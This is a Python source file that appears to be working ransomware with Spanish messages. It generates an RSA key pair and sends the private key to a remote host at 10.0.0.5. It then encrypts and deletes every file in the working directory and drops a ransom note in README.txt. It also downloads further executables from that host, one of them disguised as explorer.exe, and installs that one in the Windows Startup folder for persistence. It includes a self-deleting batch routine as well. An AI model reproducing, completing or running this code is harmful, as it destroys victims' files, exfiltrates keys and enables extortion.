from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
import socket
import os
import sys
import tempfile
import time
import base64

HOST = "10.0.0.5"

def arise(port, name):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, port))
            s.settimeout(3)
            with open(name, 'wb') as f:
                while True:
                    data = s.recv(4096)
                    if not data:
                        break
                    f.write(data)
    except Exception as e:
        print(f"[-] Error al recibir {name}: {e}")

def export(public_key, private_key):
    PORT = 4448
    try:
        public_b64 = base64.b64encode(public_key)
        private_b64 = base64.b64encode(private_key)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(public_b64 + b"\n")
            s.sendall(private_b64)
    except Exception as e:
        print(f"[-] Error exportando llaves: {e}")

def keygen():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    
    export(public_key, private_key)
    return private_key, public_key

def encrypt(public_key):
    files = []
    public_key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(public_key)

    for file in os.listdir():
        if file.endswith('.bubu') or not os.path.isfile(file):
            continue
        if file == os.path.basename(sys.executable):
            continue
        files.append(file)

    for file in files:
        with open(file, 'rb') as f:
            data = f.read()
        try:
            encrypted = cipher.encrypt(data)
            with open(file + '.bubu', 'wb') as f:
                f.write(encrypted)
            os.remove(file)
        except Exception as e:
            print(f"[-] No se pudo cifrar {file}: {e}")

    readme_path = os.path.join(os.getcwd(), 'README.txt')
    try:
        with open(readme_path, 'w') as f:
            f.write(
                'Hola amigo!\n\nAhora mismo, tal vez andas preocupado o asustado (es normal), '
                'pero tranquilo, tus archivos están a salvo conmigo (y solo conmigo).\n\n'
                'Si quieres recuperarlos, crea un archivo en tu escritorio llamado "pls.txt" '
                'y nos pondremos en contacto.'
            )
    except Exception as e:
        print(f"[-] No se pudo crear README.txt: {e}")

    arise(4449, 'BubuxLock.exe')

def move_to_startup(file_name):
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, file_name)
        if os.path.exists(dest):
            os.remove(dest)
        os.rename(file_name, dest)
        return dest
    except Exception as e:
        print(f"[-] Error moviendo a Startup: {e}")
        return None

def self_destruct():
    exe_path = sys.executable
    if exe_path.endswith(".exe"):
        bat_path = os.path.join(tempfile.gettempdir(), "autodelete.bat")
        try:
            with open(bat_path, "w") as bat:
                bat.write(f"""
@echo off
timeout /t 2 > nul
del "{exe_path}"
del "%~f0"
""")
            os.startfile(bat_path)
        except Exception as e:
            print(f"[-] Error creando .bat para autodestrucción: {e}")

if __name__ == '__main__':
    private_key, public_key = keygen()
    encrypt(public_key)
    arise(4447, 'explorer.exe')

    exe_path = move_to_startup('explorer.exe')
    if exe_path:
        try:
            os.startfile(exe_path)
        except Exception as e:
            print(f"[-] No se pudo ejecutar explorer.exe: {e}")
